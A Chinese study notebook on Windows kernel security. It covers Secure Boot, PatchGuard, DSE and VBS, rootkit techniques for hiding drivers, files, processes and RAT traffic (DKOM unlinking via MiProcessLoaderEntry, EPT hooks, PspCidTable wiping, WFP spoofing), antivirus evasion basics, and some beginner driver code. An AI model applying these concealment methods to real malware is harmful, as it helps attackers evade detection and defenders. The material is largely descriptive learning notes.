Bootkit： 早期计算机在通电之后会首先进入 BIOS，通过硬件自检之后调用主引导记录(Main Boot Record , MBR)引导 Windows 操作系统启动，在这个基础上，Bootkit 通过修改主引导记录 MBR，使其自身加载甚至早于 Windows 操作系统加载，实现隐身加载，并且绕过安全检测，Bootkit 的加载都是完全不可见的。因为他是最先启动执行的。 Windows通过 Secure Boot 技术来规避Bootkit攻击。 预启动 检查计算机是否安装并启用了 统一可扩展固件接口(The Unified Extensible Firmware Interface , UEFI) 可信平台模块(Trusted Platform Module , TPM) 计算机的 UEFI 固件会将【固件，引导加载程序，引导驱动程序等】在操作系统加载之前加载的所有内容的哈希值作为数字签名存储在 TPM 中，在存储内容变更时会对其进行验证， 验证不通过就不允许修改。 其实就是对固件的hash和数字签名进行检查。 后续 验证完成后，Windows 10 内核依次验证 Windows 操作系统启动过程中的其他组件。如果存在 Windows 内核或者其他组件被篡改的情况，引导加载程序会拒绝加载 Windows 系统。 Windows 10 通常会对这些组件进行备份，从而保证 Windows 操作系统的完整性。 2、Patch Guard 为了防止第三方程序或者恶意软件任意修改系统内核，在 Windows 64 位 系统中，微软引入了 Patch Guard 机制 能够有效防止内核驱动改动或替换Windows内核的任何内容，第三方软件将无法再给Windows Vista内核添加任何“补丁”。 Patch Guard 会定期检查系统内核关键部分，以确保内核中受保护的系统 结构未被修改，如果检测到修改，则 Windows 操作系统将启动错误检查 0x109， 并中断操作系统正常运行。 保护对象 Patch Guard 所保护的对象范围十分广泛，主要包括： 系统服务描述符表 SSDT 全局描述符表 GDT 中断描述符表 IDT 关键 MSR 寄存器 关键内核模块 除此之外，还有许多内核对象和内存区域也在 Patch Guard 的保护范围内，通过在 WinDBG 中!analyze -show 109查看。 3、DSE 强制驱动签名技术，这里区别一下DEP：堆栈不可执行。 之前 Windows 驱动程序可以直接加载进入系统内核。 驱动程序在加载进入 Windows 操作系统内核之后，可以和 Windows 操作系统内核其他组件共享同一片内存空间。 之后 在驱动程序加载之前，Windows 操作系统会对其数字签名进行验证，如果驱动程序没有合法签名，那么即使是取得计算机管理员权限， 也无法将驱动加载进入 Windows 系统内核。 4、虚拟化安全 基于虚拟化的安全：Virtual Based Security , VBS；Windows 10 1607 版本推出的又一种安全机制。通常称为内核隔离。使用硬件虚拟化在内存中创建安全区域，为其他安全功能提供了一个安全平台。 VBS 使用处理器提供的硬件虚拟化功能创建系统安全区域，并且将其与 正常操作系统相隔离，借此保护重要的操作系统组件以及用户资产，即使恶意 软件成功进入 Windows 内核模式运行，也无法访问到 VBS 保护的资源。 巨硬利用这种技术实现了两个及其影响游戏性能的功能 代码完整性保护 (Hypervisor-Protected Code Integrity , HVCI) 基于虚拟化的操作系统修改保护机制 Hyper Guard HVCI 通常称为内存完整性， 这个东西在win11中是默认开启的，但是会影响到游戏的帧率，所以一般选择关掉 Hyper Guard 扩展了 Patch Guard 的功能。Hyper Guard 使内核模式下运行的恶意软件不再和防护机制处于同一个安全等级。 不同于 Patch Guard 的定期检查， Hyper Guard 可以即时检查到篡改行为，使过去恶意软件通过精确控制时间恢复被破坏或者篡改的系统内核组件的绕过方式变得无法使用。 程序隐藏 分为四种基本隐藏形式； 驱动隐藏 》DKMO 文件隐藏 》硬件虚拟化 进程隐藏 》DKMO 通信隐藏 》WFP 1、驱动隐藏 内核级程序隐藏功能都需要通过将特定驱动程序加载进入的方式实现，同时，专业的内核防护工具也会对 Windows 操作系统已加载的内核模块进行检查。所以我们需要对特定驱动模块进行隐藏来规避检测。 过去式 XP & 7 Windows XP 和 Windows7 中 在内核内存中定位记录驱动模块信息的双向链表 InLoadOrderLinks，然后从该双向链表中摘除目标驱动模块信息对应的结构。 在内核内存中定位目标驱动程序的 DriverObject 对象，该对象 的 Section 节区记录了驱动程序的相关信息，直接将该字段设为 NULL。 上述两种方式在win10 64bit中会触发Patch Guard保护机制导致蓝屏。而且不支持SEH。、 流程 每一个 Windows 驱动程序都对应这一个 DriverObject 对象。 当驱动程序被加载进入内核之后，OS首先为驱动程序分配内存，创建 DriverObject 对象，进行初始化操作 将 DriverObject 对象中的成员对象 Section 加入双向链表 InLoadOrderLinks 调用驱动入口函数 DriverEntry()对驱动进行初始化。 隐藏方式 在 DriverEntry()函数中将 Section 对象从双向链表中摘除，并抹去部分驱动特征， 就可以达到驱动隐藏的目的 MiProcessLoaderEntry() 上述方式在老版本的Windows中可以得到运用，但是在现代系统中会触发Patch Guard保护机制，所以需要使用MiProcessLoaderEntry() 函数将目标驱动程序的 Section 节区从双向链表 InLoadOrderLinks 中摘除。 该函数会对 Patch Guard 监控的全局变量进行处理，这样在摘链时就不会触发 Patch Guard 导致蓝屏。 MiProcessLoaderEntry(pDriverObject->DriverSection, 0);// 移除 MiProcessLoaderEntry(pDriverObject->DriverSection, 1);// 添加 摘除驱动模块 1、DriverObject 对象的 DriverExtension 成员指向的是驱动程序映像的内 存区对象，该结构体中的第一个成员 InLoadOrderLinks 是一个 LIST_ENTRY 的结构。Windows 操作系统内核加载的每个驱动模块都会被加入到这个双向链 表中，只要遍历这个双向链表，就能枚举出所有的驱动模块。这里类似PEB结构体里的LDR 2、在 Windows 操作系统中的\\Driver 和\\FileSystem 目录对象中都存有 Windows 操作系统内核加载的驱动对象。只需要遍历这两个系统目录，就可以枚举出所有的驱动模块 3、为了实现驱动隐藏，不仅需要在驱动入口函数 DriverEntry()中将目标驱动 节对象 DriverSection 从节对象链表中摘除，还需要将目标驱动从\\Driver 目录 中删除，并抹去目标驱动 DriverObject 对象中的部分信息。 隐藏过程 通过将目标驱动对象的 DriverSection 对象通过 MiProcessLoaderEntry()函数从双向链表 InLoadOrderLinks 中摘除，就可以达到隐藏的目的。 摘除目标驱动模块的 DriverSection 对象之后，只需再将目标驱动从 Windows 操作系统中的\\Driver 目录中删除，并抹去部分对象特征，即可实现驱动隐藏。 总结 关键就是利用 MiProcessLoaderEntry() 这个函数，将目标驱动在双向列表中拿出来，同时防止触发PG保护。难点在于程序编写上，因为这个函数是未公开的函数，可以拿到的信息很少，而且涉及到驱动编程，但是我不会驱动编程。 2、文件隐藏 攻击中的样本往往不希望被狩猎到，所以都会采用各种方式来隐藏自己，包括多级目录，文件改名，文件不落地，依附其他进程等形式。 传统方式 传统的文件隐藏实现方式主要包括两种： (1) 通过直接挂钩 SSDT 表中的相应系统服务分发例程，对文件操作的返回值进行过滤，从而达到文件隐藏的目的。 缺点：HOOK SSDT 表的方式在 Windows 10 64 位操作系统环境下会触发 Patch Guard 机制 (2) 通过文件过滤驱动对文件操作相关 IRP 进行过滤，拦截或修改返回的 IRP，从而达到文件隐藏的目的。 缺点：文件过滤驱动容易被设备遍历的方式检测到 一种新方式 参考[Windows 10环境下的程序隐藏技术研究] 可以看作是在r1层加了一个过滤装置 因为VMM 可以 完全控制计算机硬件资源，如 CPU，IO，物理内存和中断等，所以运行在上面的软件无法判断自己是不是运行在虚拟机上。和vmware不同的是，这种虚拟技术不是完全的模拟，而是通常情况下会将各种操作放行，直接给到CPU，只有检测到特殊的指令或者异常的时候才会进行拦截。 交互过程 Guest OS 与 VMM 之间的交互利用 Intel 提供的虚拟机拓展指令 VMX(Virtual Machine Extensions)、虚拟机控制结构(VMCS , Virtual Machine Control Structure)来实现。 VM Exit：Guest OS 触发特定的事 件或者异常，从而把计算机控制器转交给 VMM 的过程 VM Entry：从 VMM 进入 Guest OS 的过程 为了实现文件隐藏，VMM 主要需要处理 EPT 内存访问引发的 VM Exit。 EPT HOOK Extend Page Table，拓展页表，是 Intel 为了实现内存虚拟化引入的新特性。 在引入EPT之前： Guest OS 对物理内存的访问被认为是敏感指令，会引发 VM Exit 事件，由 VMM 对这个过程进行处理，将 Guest OS 的物理地址转换为主机真实物理地 址返回给 Guest OS 使用。CPU 访问物理内存非常频繁，会导致不断触发模式 切换，开销很大，且通过 VMM 进行内存地址转换，效率很低 HOOK 原理 将目标函数的内存页复制为 A 和 B 两份，A 为原函数页，B 为修改之后的函数页，A 的权限设为可读写不可执行，B 的权限设为不可读写可执行。这样一来，每当执行原函数，由于权限问题，都会触发 EPT violation，VMM 会将原函数所在页物理地址定向至 B 的物理地址，实际上执行的是被修改后的函数页 B。过程如下图所示 修改 Guest OS 物理地址到真实主机物理地址的映射，没有修改 Guest OS 中的任何内 核对象或者重要系统表项，达到不触发 Patch Guard 的情况下对文件查看相关 系统调用例程进行 HOOK的目的。 3、进程隐藏 隐藏虚拟机环 境中 Vmtools 进程，避免恶意软件检测到自身处于虚拟化环境，或者隐藏蜜罐 中的监控进程而不被入侵者觉察等。 隐藏 传统方式 (1) HOOK系统服务函数 ZwQuerySystemInformation()，过滤该函数返回值，实现对用户层进程隐藏。 (2) 使用 DKOM 技术，定位内核模式内存中的进程 EPROCESS 链表，将目标进程的 EPROCESS 结构从该链表中摘除 缺点： 马上触发Patch Guard 机制、交叉视图检测，直接失效。 遍历进程的方式 调用系统函数 CreateToolhelp32Snapshot()，照快照直接遍历 在内核模式下遍历该双向链表，遍历进程 EPROCESS 结构所在的双向链表 ActiveProcessLinks 对内核模式下的内存进行暴力搜索，以 EPROCESS 结构中的成员 ObjectType 为特征码，搜索所有当前内存中存在的 EPROCESS 结构 全局句柄表 PspCidTable，存有所有系统进程和线程对象的句柄。通过解析该句柄表，遍历所有进程线程句柄 解决办法 利用函数 MiProcessLoaderEntry()将进程的 EPROCESS 结构从双向链表 ActiveProcessLinks 上摘除。 解析 PspCidTable 句柄表，将目标隐藏进程的句柄抹去。 最后对目标进程的所有线程进行处理， 将所有线程的父 ID 修改为其他进程的 ID，并修改其指向的进程。 伪装 除了基本的改名，改PEB结构体，进程注入之外，还可以通过在内核模式下通过修改进程 EPROCESS 结构中的信息实现进程伪装。 原理 为了方便起见，进程伪装的目标进程路径必须比 svchost.exe 的路径长度长，否则无法腾出额 外空间修改路径。 总结 进程隐藏的本质还是去对抗PG保护，然后修改双向链表，把目标进程那结构体拿出去，并通过PG保护检测的这么一个过程。 4、通信隐藏 作为一些RAT攻击的最后一步，将信息回传回去，肯定不希望被轻易的抓包获得。所以可以通过隐藏通信的方式达到目的 WFP Windows 文件保护 (WFP，Windows file project) 可防止程序替换重要的 Windows 系统文件。程序绝不能覆盖这些文件，因为操作系统及其他程序都要使用它们。通过保护这些文件，可以防止程序和操作系统出现问题。 使用 Windows 过滤平台 WFP 对控制端发送的网络数据包的源 IP 和源端口进行伪 装，在受控端数据链路层对其进行截取和还原，从而达到隐蔽通信的目的。 方法 基本思路就是在网络流量沿网卡和驱动栈上行或者下行的过程中插入一个过滤子层，以拦截相关网络流量。 Windows 过滤平台 WFP；位于 TCP/IP 协议驱动上层，只能拦截经过 TCP/IP 协议驱动的网络流量包。 网络驱动接口规范 NDIS 过滤驱动技术；位于协议驱动和小端口驱动之间，主要用于拦截网卡流量。 WFP 的目的，就是替代过去的传输层驱动接口(Transport layer Device Interface , TDI)。利用 WFP 框架，可以较为轻松地实现网络流量过滤和处理。所以通信隐藏主要还是利用WFP来进行的。 基本模型 核心：过滤引擎 过滤引擎可以与 OSI 7 层模型中的任意一层进行交互，实现不同的网络数据包处理功能。 网络数据包通过网卡沿网络协议栈向上传输的过程中，会被过滤引擎进行过滤，并且按照规则进行拦截； 图中的 Callout 是预设的对网络数据包的处理动作，包含过滤规则，处理方法等，就类似于键盘钩子的处理函数。 为了避免原始数据包被网络抓包软件嗅探捕获，需要在网络数据包到达抓包软件所在网络层次之后对其进行还原。 TCP / IP Windows下利用tcpip.sys这个驱动来处理tcp ip协议。包括 TCP 连接的建立和释放，超时重传，拥塞处理，差错校验等机制，以及 IP 协议的 IP 维护，ARP 表维护，校验和等机制。 这个驱动他并没有给应用程序一个接口，但是给了WFP一些接口来进行提高执行效率，我们就可以利用这个特性来拦截，修改、重定向等流量。 总结 实际上针对WFP来进行通信隐藏的方式并不是让你看不到这个流量包，还是可以通过网卡流量来进行捕获的。这种方式仅仅可以对流量包的源ip和目标ip进行还有端口等信息进行隐藏。通信的主机之间可以识别伪造的地址，并使用预置的地址映射表进行地址变换，从而使得链路上/主机上捕获到的网络流量数据是经过伪造后的数据。 总结 基于Windows下程序隐藏的技术都涉及到内核层面的操作，所以我先去学习一下Windows内核开发的一些知识，等我学完再继续。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-06-07 19:17:49 "},"MyArticles/WinKernel/hello_kernel.html":{"url":"MyArticles/WinKernel/hello_kernel.html","title":"Hello Kernel！","keywords":"","body":"配置好环境先写一个hello world来测试一下。 #include NTSTATUS unload(PDRIVER_OBJECT driver) { DbgPrint(\"Driver unload success..\"); return STATUS_SUCCESS; } NTSTATUS DriverEntry(PDRIVER_OBJECT driver, PUNICODE_STRING reg_path) { driver->DriverUnload = unload; DbgPrint(\"Hello World\\n\"); return STATUS_SUCCESS; } 构成 驱动程序格式还是挺简单的，基本上有两个必要的模块组成。 unload DriverEntry DriverEntry 相当于main函数，驱动程序的载入函数，一般包含两个参数 PDRIVER_OBJECT driver // 刚被初始化的驱动对象指针 PUNICODE_STRING reg_path // 驱动在注册表中的键值 NTSTATUS DriverEntry(PDRIVER_OBJECT driver, PUNICODE_STRING reg_path) { driver->DriverUnload = unload; // 注册卸载函数，位置无所谓。 DbgPrint(\"Hello World\\n\"); // 方便查看运行状态。 return STATUS_SUCCESS; // 和return 0没啥区别。 } DRIVER_OBJECT 结构体 这是驱动载入和退出函数的第一个参数，包含了一个驱动的详细信息。在wdn.h中可以得到定义 typedef struct _DRIVER_OBJECT { CSHORT Type; //驱动类型 CSHORT Size; //驱动大小 // // The following links all of the devices created by a single driver // together on a list, and the Flags word provides an extensible flag // location for driver objects. // PDEVICE_OBJECT DeviceObject; ULONG Flags; // // The following section describes where the driver is loaded. The count // field is used to count the number of times the driver has had its // registered reinitialization routine invoked. // PVOID DriverStart; ULONG DriverSize; PVOID DriverSection; //指向驱动程序映像的内存区对象 PDRIVER_EXTENSION DriverExtension; // // The driver name field is used by the error log thread // determine the name of the driver that an I/O request is/was bound. // UNICODE_STRING DriverName; //驱动名称 // // The following section is for registry support. This is a pointer // to the path to the hardware information in the registry // PUNICODE_STRING HardwareDatabase; // // The following section contains the optional pointer to an array of // alternate entry points to a driver for \"fast I/O\" support. Fast I/O // is performed by invoking the driver routine directly with separate // parameters, rather than using the standard IRP call mechanism. Note // that these functions may only be used for synchronous I/O, and when // the file is cached. // PFAST_IO_DISPATCH FastIoDispatch; // // The following section describes the entry points to this particular // driver. Note that the major function dispatch table must be the last // field in the object so that it remains extensible. // PDRIVER_INITIALIZE DriverInit; PDRIVER_STARTIO DriverStartIo; PDRIVER_UNLOAD DriverUnload; //驱动的卸载地址 PDRIVER_DISPATCH MajorFunction[IRP_MJ_MAXIMUM_FUNCTION + 1]; } DRIVER_OBJECT; typedef struct _DRIVER_OBJECT *PDRIVER_OBJECT; Type：该字段标识该结构体的类型，始终设置DRIVER_OBJECT_TYPE Size：该字段表示该结构体的大小，以字节为单位 DeviceObject：该字段是一个指针，指向驱动程序所创建的设备对象链表的头部。每个设备对象代表着一个设备或者驱动程序创建的一种虚拟设备 DriverStart：该字段是一个指针，指向驱动程序代码的入口点，也就是驱动程序的DriverEntry函数。该函数会在驱动程序被加载时被调用。 DriverSize：该字段表示驱动程序代码的大小，以字节为单位。 可以利用DriverSection来遍历当前系统下所有的驱动程序的具体信息。 UNICODE_STRING 结构体 在ntdef.h文件中可以看到定义 typedef struct _UNICODE_STRING { USHORT Length; USHORT MaximumLength; #ifdef MIDL_PASS [size_is(MaximumLength / 2), length_is((Length) / 2) ] USHORT * Buffer; #else // MIDL_PASS _Field_size_bytes_part_opt_(MaximumLength, Length) PWCH Buffer; #endif // MIDL_PASS } UNICODE_STRING; typedef UNICODE_STRING *PUNICODE_STRING; typedef const UNICODE_STRING *PCUNICODE_STRING; 卸载函数 驱动程序需要自定义一个卸载程序，因为系统为了稳定，驱动不会被系统自动卸载，所以需要手动去定义一下。 假如在DriverEntry中添加了某些系统回调，没有DriverUnload，系统就不知道什么时候该移除这些回调，如果暴力移除驱动，此时系统回调会出问题，系统回调表中存在了一个被移除掉的驱动的回调，当调用时系统蓝屏 。 NTSTATUS unload(PDRIVER_OBJECT driver) { DbgPrint(\"Driver unload success..\"); return STATUS_SUCCESS; } 其实也没有什么特殊操作，就告诉系统有这么一回事就行了，这里留个字符串来显示一下状态。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-08-25 14:48:35 "},"MyArticles/WinKernel/kerstr.html":{"url":"MyArticles/WinKernel/kerstr.html","title":"字符串 - 但是内核安全","keywords":"","body":"定义字符串 内核中对字符串的操作没有stdio库里的那些函数，取而代之的是内核安全字符串，每个字符串是一个结构体。主要是利用几个内核API进行操作。 RtlInitAnsiString(&ansi, char_string); RtlInitUnicodeString(&unicode, wchar_string); RtlUnicodeStringInit(&str, L\"hello kernel\"); // 这里网上说改变原字符串会影响新的，但是测试发现不会，比较迷惑 定义上差不多，可以采用普通的定义方式，也可以采用内核特有的定义方式。 //typedef struct _UNICODE_STRING //{ // USHORT Length; // USHORT MaxmumLength; // PWSTR Buffer; //} UNICODE_STRING; // 定义内核字符串,其实都是结构体格式 ANSI_STRING ansi; UNICODE_STRING unicode; UNICODE_STRING str; // 定义普通字符串 char* char_string = \"hello lyshark\"; wchar_t* wchar_string = (WCHAR*)\"hello lyshark\"; 完整的测试代码如下，注意的是需要引用这个库。 #include #include #include // 使用RtlUnicodeStringInit函数需要这个头文件，定义了内核安全字符串 #include NTSTATUS UseKernelString() { //typedef struct _UNICODE_STRING //{ // USHORT Length; // USHORT MaxmumLength; // PWSTR Buffer; //} UNICODE_STRING; // 定义内核字符串,其实都是结构体格式 ANSI_STRING ansi; UNICODE_STRING unicode; UNICODE_STRING str; // 定义普通字符串 char* char_string = \"hello lyshark\"; wchar_t* wchar_string = (WCHAR*)\"hello lyshark\"; // 初始化字符串，相当于是把第二个参数的字符在复制到第一个参数，符合内核安全的格式 RtlInitAnsiString(&ansi, char_string); RtlInitUnicodeString(&unicode, wchar_string); RtlUnicodeStringInit(&str, L\"hello lyshark\"); // 长度除了unicode没显示不知道为啥，第一个是13，第三个26，符合预期 DbgPrint(\"输出ANSI: %Z | %d\\n\", &ansi, ansi.Length); DbgPrint(\"输出WCHAR: %Z | %d \\n\", &unicode, unicode.Length); DbgPrint(\"输出字符串: %wZ | %d \\n\", &str, str.Length); // 改变原始字符串，不影响上面的初始化的字符串 char_string[0] = 'A'; // char类型每个占用1字节 char_string[1] = 'B'; wchar_string[0] = (WCHAR)'A'; // wchar类型每个占用2字节 wchar_string[2] = (WCHAR)'B'; DbgPrint(\"输出ANSI: %Z \\n\", &ansi); DbgPrint(\"输出WCHAR: %Z \\n\", &unicode); DbgPrint(\"输出字符串: %wZ \\n\", &str); return STATUS_SUCCESS; } NTSTATUS unload(PDRIVER_OBJECT driver) { DbgPrint(\"Driver unload success..\"); return STATUS_SUCCESS; } NTSTATUS DriverEntry(PDRIVER_OBJECT driver, PUNICODE_STRING reg_path) { driver->DriverUnload = unload; DbgPrint(\"2.5 Hello World\\n\"); if (UseKernelString()) { DbgPrint(\"Call UseKernelString function succeed \\n\"); } return STATUS_SUCCESS; } 字符串操作 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-08-27 21:13:19 "},"MyArticles/WinKernel/user_procs.html":{"url":"MyArticles/WinKernel/user_procs.html","title":"链表 - 遍历用户进程","keywords":"","body":"内核中提供了专用的链表结构： LIST_ENTRY，还有一些对链表的操作函数。通过枚举用户进程的功能。用户层是直接照一个进程快照，然后遍历快照的方式进行的。内核层就是去遍历LLIST_ENTRY链表达到目的。 // 遍历用户进程 - 熟悉内核链表和结构体 // 先引用ntifs，再引用ntddk #include #include #include // 前向声明，声明后就可以使用 extern PVOID PsGetProcessPeb(_In_ PEPROCESS Process); extern NTKERNELAPI PVOID PsGetProcessWow64Process(_In_ PEPROCESS Process); extern NTKERNELAPI UCHAR* PsGetProcessImageFileName(IN PEPROCESS Process); NTKERNELAPI NTSTATUS PsLookupProcessByProcessId(HANDLE ProcessId, PEPROCESS* Process); extern NTKERNELAPI HANDLE PsGetProcessInheritedFromUniqueProcessId(IN PEPROCESS Process); // 设置结构体保存进程信息 typedef struct { DWORD Pid; UCHAR ProcessName[2048]; DWORD Handle; LIST_ENTRY ListEntry; } ProcessList; BOOLEAN GetAllProcess() { PEPROCESS eproc = NULL; LIST_ENTRY linkListHead; // 初始化链表头部 InitializeListHead(&linkListHead); ProcessList* pdata = NULL; // 这里步长是4，改成其他的都行，看实际情况 for (int Pid = 0; Pid Pid = (DWORD)PsGetProcessId(eproc); RtlCopyMemory(pdata->ProcessName, PsGetProcessImageFileName(eproc),strlen(PsGetProcessImageFileName(eproc)) * 2); pdata->Handle = (DWORD)PsGetProcessInheritedFromUniqueProcessId(eproc); // 插入元素 InsertTailList(&linkListHead, &pdata->ListEntry); ObDereferenceObject(eproc); } } } // 输出链表内的数据 while (!IsListEmpty(&linkListHead)) { LIST_ENTRY* pEntry = RemoveHeadList(&linkListHead); pdata = CONTAINING_RECORD(pEntry, ProcessList, ListEntry); DbgPrint(\"%d | %s | %d \\n\", pdata->Pid, pdata->ProcessName, pdata->Handle); ExFreePool(pdata); } return TRUE; } NTSTATUS unload(PDRIVER_OBJECT driver) { DbgPrint(\"Driver unload success..\"); return STATUS_SUCCESS; } NTSTATUS DriverEntry(PDRIVER_OBJECT driver, PUNICODE_STRING reg_path) { driver->DriverUnload = unload; DbgPrint(\"3 Hello World\\n\"); GetAllProcess(); return STATUS_SUCCESS; } 从程序本身来看，和一般的程序没有啥区别，就是使用api不同了，一些关键函数名称参数不同而已。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-08-27 22:40:29 "},"MyArticles/WinKernel/ker_mod.html":{"url":"MyArticles/WinKernel/ker_mod.html","title":"链表 - 遍历内核模块","keywords":"","body":"DriverSection成员指向_LDR_DATA_TABLE_ENTRY 的结构体，该结构体每个驱动模块都有一份，在这个结构体中就保存着一个驱动模块的所有信息。同时InLoadOrderLinks成员又是_LIST_ENTRY类型的结构体， 系统中维护了一个双向链表，每个节点都是一个驱动的信息。 Flink 指向下一个驱动对象的 _LDR_DATA_TABLE_ENTRY Blink 指向上一个驱动对象的 _LDR_DATA_TABLE_ENTRY。 typedef struct _LDR_DATA_TABLE_ENTRY { LIST_ENTRY InLoadOrderLinks; // 遍历的关键 LIST_ENTRY InMemoryOrderLinks; LIST_ENTRY InInitializationOrderLinks; PVOID DllBase; PVOID EntryPoint; ULONG SizeOfImage; UNICODE_STRING FullDllName; UNICODE_STRING BaseDllName; ULONG Flags; USHORT LoadCount; USHORT TlsIndex; union { LIST_ENTRY HashLinks; struct { PVOID SectionPointer; ULONG CheckSum; }; }; union { struct { ULONG TimeDateStamp; }; struct { PVOID LoadedImports; }; }; } LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY; // 第一个成员的结构体类型 typedef struct _LIST_ENTRY { struct _LIST_ENTRY *Flink; struct _LIST_ENTRY *Blink; } LIST_ENTRY, PRLIST_ENTRY; 程序思路就是对循环链表的遍历，差不多如下图所示 #include typedef struct _LDR_DATA_TABLE_ENTRY { // 和上面一样 } LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY; NTSTATUS UnloadDriver(PDRIVER_OBJECT driver) { DbgPrint(\"dirver unload success\\n\"); return STATUS_SUCCESS; } NTSTATUS DriverEntry(PDRIVER_OBJECT driver, PUNICODE_STRING reg_path) { DbgPrint(\"2 Hello World\\n\"); driver->DriverUnload = UnloadDriver; PLDR_DATA_TABLE_ENTRY pldr = NULL; PLDR_DATA_TABLE_ENTRY pcurrentmodule = NULL; // 因为是循环链表，所以可以任意节点开始访问，但是注意设置退出条件 PLIST_ENTRY plistentry = NULL; PLIST_ENTRY pcurrent = NULL; pldr = (PLDR_DATA_TABLE_ENTRY)driver->DriverSection; plistentry = pldr->InLoadOrderLinks.Flink; pcurrent = plistentry->Flink; // 判断是否遍历结束 while (pcurrentmodule != plistentry) { // 获取LDR_DATA_TABLE_ENTRY结构 pcurrentmodule = CONTAINING_RECORD(pcurrent, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks); if (pcurrentmodule->BaseDllName.Buffer != 0) { DbgPrint(\"module name: %wZ | module baseaddr: %p | FullDllName: %wZ\", pcurrentmodule->BaseDllName, pcurrentmodule->DllBase, pcurrentmodule->FullDllName); } pcurrent = pcurrent->Flink; } return STATUS_SUCCESS; } 其中用到了一个很方便的宏，这个宏解决了一个重要的问题：通过结构体中某个元素串起来的一个链表，直到了元素的地址，如何获得其所在结构体的地址。 //根据某个结构体中成员变量的地址，计算出结构体地址。 #define CONTAINING_RECORD(address, type, field) ((type *)( \\ (PCHAR)(address) - \\ (ULONG_PTR)(&((type *)0)->field))) address，成员变量地址 type，结构体类型 field，成员变量名 上述代码中根据pcurrent的值（LDR_DATA_TABLE_ENTRY结构体的第一个元素的Flink值）找到结构体LDR_DATA_TABLE_ENTRY的地址 pcurrentmodule = CONTAINING_RECORD(pcurrent, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks); 看到效果还不错 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-08-27 22:24:26 "},"MyArticles/Antivirus.html":{"url":"MyArticles/Antivirus.html","title":"Bypass Anti-virus","keywords":"","body":"免杀学习，记录一些平时遇到的免杀技巧，来自网络教程、来自道听途说抑或是来自从样本中学到的免杀手法。 分类 免杀一般情况分两种 bypass 个人杀软 bypass EDR、NDR 杀软 杀软一般是个人使用，360，火绒、还有微软亲儿子，exe亲爹的win def这些。这些一般个人使用，查杀力度比较大，检查比较严格。 *DR 一般作用与企业或者大型机构，为了面向的场景也更加复杂，同时为了保证业务的正常进行，往往不如杀软的查杀力度大，相比而言会更加好过一点，但是背后的研发力量和实时响应能力是杀软无可比拟的。 测试 一般本地测试就测360、火绒、腾讯安全管家这三种；沙箱测试就vt，微步这俩出名的沙箱，上面的引擎也全面。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-08-25 10:35:56 "},"MyArticles/bypass_antivirus/openARK/openark.html":{"url":"MyArticles/bypass_antivirus/openARK/openark.html","title":"学习 - OpenARK","keywords":"","body":"来自： BlackINT3/OpenArk: OpenArk is an open source anti-rookit(ARK) tool for Windows. (github.com) BlackINT3/none: UNONE and KNONE is a couple of open source base library that makes it easy to develop software on Windows. (github.com) 第一个项目是openARK，第二个项目是第一个项目的技术支持库。 准备通过学习这个项目来学习r0和r3的安全知识 顺便说一句，openark这个工具倒是还挺方便的。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-08-28 14:32:22 "}}